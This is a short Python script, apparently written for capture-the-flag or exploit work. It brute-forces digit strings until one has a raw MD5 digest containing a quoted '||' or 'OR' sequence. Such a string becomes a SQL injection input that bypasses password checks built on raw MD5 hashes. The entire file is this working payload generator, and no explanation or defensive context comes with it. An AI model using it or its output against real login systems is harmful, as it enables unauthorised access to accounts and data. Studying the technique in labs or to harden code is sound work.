import hashlib
import random
import time

def find_injection_string():
    i = 0
    random.seed(time.time())

    while True:
        i += 1
        if i % 100000 == 0:
            print(f"i = {i}")

        # Pick a random string made of digits
        r = random.randint(0, 99999999)
        rbuf = f"{r}{random.randint(0, 99999999)}{random.randint(0, 99999999)}{random.randint(0, 99999999)}"

        # Calculate MD5
        md5_hash = hashlib.md5(rbuf.encode()).digest()

        # Find || or any case of OR
        match = b"'||'" in md5_hash or b"'OR'" in md5_hash.upper()

        if match:
            print(f"content: {rbuf}")
            print(f"count:   {i}")
            print("hex:     ", md5_hash.hex())
            print("raw:     ", md5_hash)
            break

find_injection_string()